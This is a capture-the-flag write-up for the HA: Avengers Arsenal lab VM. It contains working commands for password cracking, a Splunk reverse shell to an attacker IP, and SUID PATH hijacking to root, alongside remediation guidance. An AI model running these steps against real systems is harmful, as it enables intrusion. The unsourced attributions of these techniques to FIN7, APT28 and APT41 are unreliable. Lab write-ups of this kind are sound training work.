# HA: Avengers Arsenal — Assemble the Attack Chain

Earth's mightiest heroes left their weapons lying around in the worst-secured server imaginable. HA: Avengers Arsenal is a multi-flag CTF that packs five distinct techniques into one machine: exposed `.git` history leaking a Base64 flag, whitespace steganography via Spammimic, CUPP-generated wordlist cracking zip and PDF files, hex-decoded Splunk credentials hidden in HTML source, and a SUID binary with PATH hijacking. Five flags, five completely different techniques. Solid, dude — this machine is a tour of the CTF skillset. legit W.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | HA: Avengers Arsenal |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-avengers-arsenal,419/ |
| **Techniques** | Exposed .git history, git commit analysis, Base64 decoding, directory brute-force, QR code scanning, Spammimic whitespace steganography, CUPP targeted wordlist generation, zip/PDF password cracking (John the Ripper), HTML source credential hunting, hex decoding, Splunk RCE via splunk_shells, SUID PATH hijacking, hidden spreadsheet cell |
| **CVEs** | CWE-538 (Exposed .git directory), CWE-522 (Inadequately Protected Credentials — hex in HTML), CWE-732 (Incorrect Permission Assignment for Critical Resource — SUID binary with relative PATH) |
| **APT Groups** | APT41 — used Splunk administrator access for persistent surveillance in enterprise environments; FIN7 — exploited SUID misconfigurations on Linux systems for lateral movement; APT28 — git repository exfiltration to harvest historical secrets |

---

## Attack Summary

```
nmap → HTTP (80), Splunk (8000, 8089)
  → /.git/ exposed → git clone GitHub repo → git log → base64 → FLAG 1 (Cap's Shield)
  → dirb → /images/ → 17.jpeg (QR code) → scan → "spammimc"
  → /spammimc/ → sceptre.txt (whitespace steg) → Spammimic decode → FLAG 2 (Loki's Scepter)
  → /groot/ → hammer.zip → password-protected PDF
  → /avengersbook.html → Tony Stark profile → CUPP → tony.txt
  → zip2john + john --wordlist=tony.txt → Stark12008
  → pdf2john + john --wordlist=tony.txt → Tony_050081 → PDF → FLAG 3 (Thor's Mjølnir)
  → HTML source of / → hex comment: 6167656e743a6176656e67657273
  → xxd -r -p → agent:avengers → Splunk login
  → splunk_shells app upload → | revshell std ATTACKER 1234 → shell
  → find SUID → /opt/ignite → strings → calls ifconfig (relative)
  → echo "/bin/bash" > /tmp/ifconfig → PATH=/tmp:$PATH → /opt/ignite → root
  → /root/final.txt → FLAG 4 (Storm Breaker)
  → /opt/yaka.xlsx → cell N20 → FLAG 5 (Spreadsheet)
```

---

## Methodology

1. Full port scan: identify HTTP and Splunk web/management ports
2. Exposed `.git` directory: dump GitHub reference and extract flag from commit history
3. Directory brute-force: discover hidden image path, QR code, steganographic text
4. Whitespace steganography: Spammimic decode for second flag
5. Profile-based CUPP wordlist generation: crack zip and PDF passwords
6. HTML source mining: hex-decode Splunk credentials
7. Splunk RCE: upload `splunk_shells` app, trigger reverse shell
8. SUID PATH hijacking: abuse `/opt/ignite` calling `ifconfig` by relative path
9. Spreadsheet analysis: hidden cell content

---

## Step 1 — Full Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -A -p- 192.168.1.101
```

Open ports:
- **80/tcp** — HTTP (Apache)
- **8000/tcp** — Splunk web interface
- **8089/tcp** — Splunk management interface

The scan also reveals a `.git` directory and `/groot` path on port 80. ᕕ( ᐛ )ᕗ

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Flag 1: Git Repository Exfiltration (Captain America's Shield)

The `.git` directory is publicly accessible via port 80. Instead of running a full GitTools dump, the exposed `HEAD` references a GitHub repository directly:

```bash
curl -s http://192.168.1.101/.git/HEAD
# ref: refs/heads/master
# or
curl -s http://192.168.1.101/.git/config
# [remote "origin"] url = https://github.com/Hackingzone/hackingarticles.git
```

Clone the referenced repository:

```bash
git clone https://github.com/Hackingzone/hackingarticles.git
cd hackingarticles/
git log --oneline
git show 4fb65717a4bdfa8169fb0642abf0f355f7eea048
```

The commit contains a Base64-encoded string:

```bash
echo "Q2FwdGFpbiBBbWVyaWNhJ3MgU2hpZWxkOnswNjE3ODZEOUE4QkI4OUEyRkU3NDVERDI2RkUyRTEzQ30=" | base64 -d
```

Output: **Flag 1 — Captain America's Shield: {061786D9A8BB89A2FE74DED26FE2E13C}**

**Real-world note:** APT28 routinely clones developer-referenced GitHub repositories to harvest credentials and sensitive data committed in "fix", "cleanup", or "remove hardcoded" commits. The GitHub Secret Scanning program intercepts over 1 million secrets per year — mostly in public repos where developers thought a fast delete would erase the evidence.

**MITRE ATT&CK:** T1552.001 — Credentials in Files (VCS history); T1083 — File and Directory Discovery

---

## Step 3 — Flag 2: Whitespace Steganography (Loki's Scepter)

Brute-force the web root:

```bash
dirb http://192.168.1.101/ \
  /usr/share/wordlists/dirb/common.txt
```

Discovered: `/images/`. Browse to it and look for unlisted files:

```bash
curl -s http://192.168.1.101/images/ | grep -i "\.jpeg\|\.png\|\.gif"
```

Found: `17.jpeg` — a QR code image not linked from any page. Scan it:

```bash
zbarimg http://192.168.1.101/images/17.jpeg
# or save and scan with any QR reader app
# Output: "spammimc"
```

Navigate to `http://192.168.1.101/spammimc/` — find `sceptre.txt`. The file appears blank. This is whitespace steganography:

**What is Spammimic?** Spammimic encodes binary data as seemingly innocent blank/whitespace text by using patterns of spaces and tabs. It looks empty but carries encoded data. Decode at `https://www.spammimic.com/decode.shtml` — paste the file contents.

```bash
curl -s http://192.168.1.101/spammimc/sceptre.txt | wc -c
# Non-zero despite appearing blank — confirms steganography
```

Paste into the Spammimic decoder → **Flag 2 — Loki's Scepter**

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information (steganography); T1083 — File and Directory Discovery

---

## Step 4 — Flag 3: CUPP + Targeted Password Cracking (Thor's Mjølnir)

`/groot/` contains `hammer.zip` — a password-protected archive containing a PDF.

The page `/avengersbook.html` is a fake social media profile for Tony Stark with biographical data. CUPP (Common User Passwords Profiler) generates targeted wordlists from personal details:

```bash
cd /opt/cupp
python3 cupp.py -i
```

Fill in Tony Stark's details from `/avengersbook.html`:
- First Name: tony
- Surname: stark
- Nickname: ironman
- Birthdate: 01052008 (May 1, 2008 — Iron Man movie release)

CUPP generates `tony.txt` with hundreds of password permutations.

**Crack the zip:**

```bash
zip2john hammer.zip > zip_hash.txt
john --wordlist=/opt/cupp/tony.txt zip_hash.txt
# Password: Stark12008
```

Extract the PDF from the zip, then crack the PDF:

```bash
unzip -P Stark12008 hammer.zip
pdf2john Mjolnir.pdf > pdf_hash.txt
john --wordlist=/opt/cupp/tony.txt pdf_hash.txt
# Password: Tony_050081
```

Open the PDF with `Tony_050081` to retrieve **Flag 3 — Thor's Mjølnir**

**Real-world note:** CUPP-style targeted wordlists are a staple of corporate penetration tests. Employees routinely use combinations of their name, birthdate, company name, and birth year. FIN7 used similar techniques against human resources systems to crack employee account passwords in their 2018 Chipotle and Arby's campaigns.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking; T1589.001 — Gather Victim Identity Information: Credentials

---

## Step 5 — Splunk Credentials from Hex in HTML Source

Browse to `http://192.168.1.101/` and view source:

```bash
curl -s http://192.168.1.101/ | grep "<!--"
```

A comment contains a hex-encoded string:

```bash
echo "6167656e743a6176656e67657273" | xxd -r -p
# agent:avengers
```

Login to Splunk at `http://192.168.1.101:8000` with `agent:avengers`.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1027 — Obfuscated Files or Information (hex encoding)

---

## Step 6 — Splunk Reverse Shell

**What is Splunk's reverse shell capability?** Splunk processes search queries using its own scripting engine. When an app provides custom search commands backed by system scripts, those scripts execute with Splunk's process privileges. The `splunk_shells` community package adds a `revshell` search command that spawns a reverse shell.

Download `splunk_shells` from GitHub (TBGSecurity/splunk_shells).

In Splunk web UI:
1. Navigate to **Apps → Manage Apps → Install app from file**
2. Upload the `splunk_shells.tar.gz` package
3. Restart Splunk when prompted
4. Set app permissions: read by everyone, context "All apps"

Start the listener:
```bash
nc -lvnp 1234
```

In the Splunk search bar:
```
| revshell std 192.168.1.107 1234
```

Shell connects. Upgrade it:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1190 — Exploit Public-Facing Application

---

## Step 7 — Flag 4: SUID PATH Hijacking (Storm Breaker)

Enumerate SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Found: `/opt/ignite`. Inspect it:

```bash
strings /opt/ignite | grep -v "^$"
```

`/opt/ignite` calls `ifconfig` by relative path (without `/sbin/ifconfig`). This means it searches the shell's `$PATH` for `ifconfig`.

**What is PATH hijacking?** When a SUID binary calls a program by relative name, the OS searches directories in `$PATH` in order. By prepending a directory we control, we can substitute our own `ifconfig` executable that runs as root:

```bash
cd /tmp
echo "/bin/bash" > ifconfig
chmod 777 ifconfig
export PATH=/tmp:$PATH
/opt/ignite
id
# uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/final.txt
# FLAG 4 — Storm Breaker
```

**Real-world note:** GTFOBins and the OWASP Testing Guide both document PATH hijacking for SUID binaries. FIN7 used this technique in Linux environments to escalate from web server context to root during their Hospitality sector campaigns.

**MITRE ATT&CK:** T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable; T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 8 — Flag 5: Hidden Spreadsheet Cell

In `/opt/` find `yakahints.txt` and `yaka.xlsx`:

```bash
cat /opt/yakahints.txt
# "Guardians of The Galaxy Vol. 1 Release date is 20 14"
```

The hint: row 20, column 14. Copy the spreadsheet:

```bash
cp /opt/yaka.xlsx /var/www/html/
```

Download to the attacker machine:
```bash
wget http://192.168.1.101/yaka.xlsx
```

Open in LibreOffice Calc. The spreadsheet appears blank. Navigate to cell **N20** (column 14, row 20). The flag is visible in the formula bar — hidden by white font on white background.

**Flag 5 — Spreadsheet flag**

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information (hidden cell content)

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Flag 1 | Captain America's Shield: {061786D9A8BB89A2FE74DED26FE2E13C} | GitHub commit history (Base64 decode) | Read |
| Flag 2 | Loki's Scepter | /spammimc/sceptre.txt (Spammimic decode) | Decoded |
| Flag 3 | Thor's Mjølnir | Mjolnir.pdf in hammer.zip (zip PW: Stark12008, PDF PW: Tony_050081) | CUPP + John |
| Credential | agent:avengers | HTML source hex decode | Splunk login |
| Flag 4 | Storm Breaker | /root/final.txt | SUID PATH hijack |
| Flag 5 | Spreadsheet flag | /opt/yaka.xlsx cell N20 | LibreOffice Calc |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | `.git` exposed + GitHub repo reference | Production deployments that copy source trees expose full history including deleted secrets | Block `/.git/` at web server; deploy only artifacts; use GitHub Secret Scanning |
| 2 | Whitespace steganography in a "blank" text file | Covert channel communication using whitespace encoding appears in threat intelligence reports (APT groups using steganography for C2) | File content anomaly detection: check file size vs. visual content; scan for hidden data |
| 3 | CUPP targeted wordlist cracks zip/PDF | Corporate pen tests regularly break employee passwords using CUPP with LinkedIn-sourced profile data | Enforce password managers; prohibit personal data in passwords; use randomly generated credentials |
| 4 | Splunk credentials in HTML comment (hex) | Multiple APT41 intrusions leveraged compromised Splunk admin access for persistent log manipulation and surveillance | Splunk admin requires MFA; no credentials in HTML; restrict Splunk to management networks |
| 5 | SUID binary calling ifconfig by relative path | PATH hijacking via SUID is a well-known privesc in real enterprise Linux environments | Audit SUID binaries: `find / -perm -u=s -type f`; use absolute paths in all SUID binaries |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Credentials in Files (VCS) | T1552.001 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information | T1027 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Initial Access | Initial Access | Exploit Public-Facing Application (Splunk) | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid and Setgid | T1548.001 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow: PATH Interception | T1574.007 |

---

## Remediation and Containment

### Technical Fixes

1. **Block `/.git/` at web server level** — Nginx: `location ~ /\.git { deny all; }` — never expose repository history
2. **Rotate all secrets in the GitHub repo history** — `git filter-repo` to purge, then force-push; treat the history as public
3. **Remove credentials from HTML source** — never store credentials in comments; use server-side secrets management (Vault, AWS Secrets Manager)
4. **Enforce Splunk MFA and IP-restrict management port 8089** — Splunk admin access = OS-level RCE; treat it as critical
5. **Audit all SUID binaries** — `find / -perm -u=s -type f 2>/dev/null`; remove SUID bit from non-essential binaries; replace relative paths with absolute paths in SUID binaries
6. **Disable plugin/app upload in Splunk** if not required for operations

### If You Find This in Your Environment

- Remove any unauthorized apps from Splunk; check `$SPLUNK_HOME/etc/apps/` for unknown entries
- Rotate `agent:avengers` Splunk credentials immediately
- Audit `find / -perm -u=s` and verify every SUID binary is intentional
- Check `.git/config` for external repository references that expose internal data

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Audit web-exposed `.git/` directories; inventory SUID binaries |
| Protect | Access Control | MFA for Splunk admin; restrict management ports to trusted IPs |
| Protect | Data Security | Remove credentials from HTML; block `.git/` access |
| Detect | Anomalies and Events | Alert on Splunk app uploads; SUID binary execution monitoring |
| Respond | Response Planning | Remove unauthorized Splunk apps; rotate credentials; remove SUID from affected binaries |
| Recover | Recovery Planning | Rebuild Splunk configuration from clean state |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict Splunk management interface to trusted IP ranges |
| AC-6 | Least Privilege | Remove SUID bit from non-essential binaries; restrict Splunk user privileges |
| IA-2(1) | Multi-Factor Authentication | MFA for all Splunk admin accounts |
| IA-5 | Authenticator Management | Rotate Splunk credentials; no credentials in HTML |
| CM-7 | Least Functionality | Block `.git/` web access; disable Splunk app upload if not required |
| SI-7 | Software Integrity | Audit Splunk apps regularly; monitor for unauthorized installations |

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Authentication | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

HA: Avengers Arsenal is one of the most creative machines in the HA series. Five completely different techniques, each themed around a different Avenger's weapon — the design is clever and the variety makes this an excellent skills sampler for intermediate practitioners.

The Spammimic flag is particularly inspired: whitespace steganography is a real technique used in threat actor communication, and seeing it in a CTF context is genuinely educational. The CUPP flag teaches the value of OSINT-driven wordlist generation, a skill that translates directly to corporate pentesting.

Shoutout to the creator for packing so much into one machine. Earth's mightiest writeup. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
